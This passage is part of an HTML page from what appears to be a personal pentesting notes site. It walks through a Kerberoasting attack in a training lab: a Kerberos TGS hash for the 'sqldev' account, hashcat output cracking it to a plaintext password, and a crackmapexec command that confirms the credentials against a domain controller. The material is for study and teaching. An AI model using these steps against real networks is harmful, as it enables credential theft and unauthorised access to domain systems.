+<span class="nv">$krb5tgs$23$*</span>sqldev<span class="nv">$INLANEFREIGHT</span>.LOCAL<span class="nv">$INLANEFREIGHT</span>.LOCAL/sqldev*<span class="nv">$81</span>f3efb5827a05f6ca196990e67bf751<span class="nv">$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f</span>:database!
+
+Session..........:<span class="w"> </span>hashcat
+Status...........:<span class="w"> </span>Cracked
+Hash.Name........:<span class="w"> </span>Kerberos<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>etype<span class="w"> </span><span class="m">23</span>,<span class="w"> </span>TGS-REP
+Hash.Target......:<span class="w"> </span><span class="nv">$krb5tgs$23$*</span>sqldev<span class="nv">$INLANEFREIGHT</span>.LOCAL<span class="nv">$INLANEFREIG</span>...404c1f
+Time.Started.....:<span class="w"> </span>Tue<span class="w"> </span>Feb<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">17</span>:45:29<span class="w"> </span><span class="m">2022</span>,<span class="w"> </span><span class="o">(</span><span class="m">10</span><span class="w"> </span>secs<span class="o">)</span>
+Time.Estimated...:<span class="w"> </span>Tue<span class="w"> </span>Feb<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">17</span>:45:39<span class="w"> </span><span class="m">2022</span>,<span class="w"> </span><span class="o">(</span><span class="m">0</span><span class="w"> </span>secs<span class="o">)</span>
+Guess.Base.......:<span class="w"> </span>File<span class="w"> </span><span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+Guess.Queue......:<span class="w"> </span><span class="m">1</span>/1<span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span>
+Speed.#1.........:<span class="w">   </span><span class="m">821</span>.3<span class="w"> </span>kH/s<span class="w"> </span><span class="o">(</span><span class="m">11</span>.88ms<span class="o">)</span><span class="w"> </span>@<span class="w"> </span>Accel:64<span class="w"> </span>Loops:1<span class="w"> </span>Thr:64<span class="w"> </span>Vec:8
+Recovered........:<span class="w"> </span><span class="m">1</span>/1<span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span><span class="w"> </span>Digests
+Progress.........:<span class="w"> </span><span class="m">8765440</span>/14344386<span class="w"> </span><span class="o">(</span><span class="m">61</span>.11%<span class="o">)</span>
+Rejected.........:<span class="w"> </span><span class="m">0</span>/8765440<span class="w"> </span><span class="o">(</span><span class="m">0</span>.00%<span class="o">)</span>
+Restore.Point....:<span class="w"> </span><span class="m">8749056</span>/14344386<span class="w"> </span><span class="o">(</span><span class="m">60</span>.99%<span class="o">)</span>
+Restore.Sub.#1...:<span class="w"> </span>Salt:0<span class="w"> </span>Amplifier:0-1<span class="w"> </span>Iteration:0-1
+Candidates.#1....:<span class="w"> </span>davius07<span class="w"> </span>-&gt;<span class="w"> </span>darten170
+
+Started:<span class="w"> </span>Tue<span class="w"> </span>Feb<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">17</span>:44:49<span class="w"> </span><span class="m">2022</span>
+Stopped:<span class="w"> </span>Tue<span class="w"> </span>Feb<span class="w"> </span><span class="m">15</span><span class="w"> </span><span class="m">17</span>:45:41<span class="w"> </span><span class="m">2022</span>
+</pre></div>
+</div>
+</section>
+<section id="testing-authentication-against-a-domain-controller">
+<h2>Testing Authentication against a Domain Controller<a class="headerlink" href="#testing-authentication-against-a-domain-controller" title="Link to this heading"></a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>Temen@htb<span class="o">[</span>/htb<span class="o">]</span>$<span class="w"> </span>sudo<span class="w"> </span>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">172</span>.16.5.5<span class="w"> </span>-u<span class="w"> </span>sqldev<span class="w"> </span>-p<span class="w"> </span>database!
+
+SMB<span class="w">         </span><span class="m">172</span>.16.5.5<span class="w">      </span><span class="m">445</span><span class="w">    </span>ACADEMY-EA-DC01<span class="w">  </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:ACADEMY-EA-DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:INLANEFREIGHT.LOCAL<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB<span class="w">         </span><span class="m">172</span>.16.5.5<span class="w">      </span><span class="m">445</span><span class="w">    </span>ACADEMY-EA-DC01<span class="w">  </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>INLANEFREIGHT.LOCAL<span class="se">\s</span>qldev:database!<span class="w"> </span><span class="o">(</span>Pwn3d!
+</pre></div>
+</div>
+</section>
+<section id="references">
+<h2>References<a class="headerlink" href="#references" title="Link to this heading"></a></h2>
+<table class="docutils align-default" id="id1">
+<caption><span class="caption-text">References</span><a class="headerlink" href="#id1" title="Link to this table"></a></caption>
+<colgroup>
+<col style="width: 30.0%" />
+<col style="width: 70.0%" />
+</colgroup>
+<thead>
+<tr class="row-odd"><th class="head"><p>Names</p></th>
+<th class="head"><p>Link</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p>SPN’s</p></td>
+<td><p><a class="reference external" href="https://thebackroomtech.com/2018/08/21/explanation-of-service-principal-names-in-active-directory/">https://thebackroomtech.com/2018/08/21/explanation-of-service-principal-names-in-active-directory/</a></p></td>
+</tr>
+<tr class="row-odd"><td><p>HashCat</p></td>
+<td><p><a class="reference internal" href="../../tags/hashcat.html#hashcat"><span class="std std-ref">hashcat</span></a></p></td>
+</tr>
+</tbody>
+</table>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="Living%20Off%20the%20Land.html" class="btn btn-neutral float-left" title="Living Off the Land" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../Lateral%20Movement/Changing%20the%20user-agent%20to%20avoid%20detection.html" class="btn btn-neutral float-right" title="Changing the user-agent to avoid detection" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2024, CelestialTech.ca.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
